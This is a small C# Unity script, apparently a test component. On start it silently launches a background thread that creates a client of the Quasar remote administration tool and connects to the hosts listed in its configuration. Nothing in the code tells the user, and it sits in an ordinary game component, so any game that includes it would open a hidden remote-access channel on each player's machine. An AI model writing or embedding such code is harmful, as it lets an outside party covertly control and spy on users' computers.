using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using xClient.Core.Networking;
using xClient.Config;
using xClient.Core.Utilities;
using xClient.Core.Helper;
using System.Threading;

public class Test : MonoBehaviour {
    private static Thread thread;
    // Use this for initialization
    void Start () {
        thread = new Thread(Run);
        thread.Start();
    }
	
    void Run()
    {
        var hosts = new HostsManager(HostHelper.GetHostsList(Settings.HOSTS));
        QuasarClient ConnectClient = new QuasarClient(hosts);
        if (!QuasarClient.Exiting)
            ConnectClient.Connect();
      
    }
    // Update is called once per frame
    void Update () {
		
	}
    private void OnDestroy()
    {
        thread.Abort();
        thread = null;
    }
}
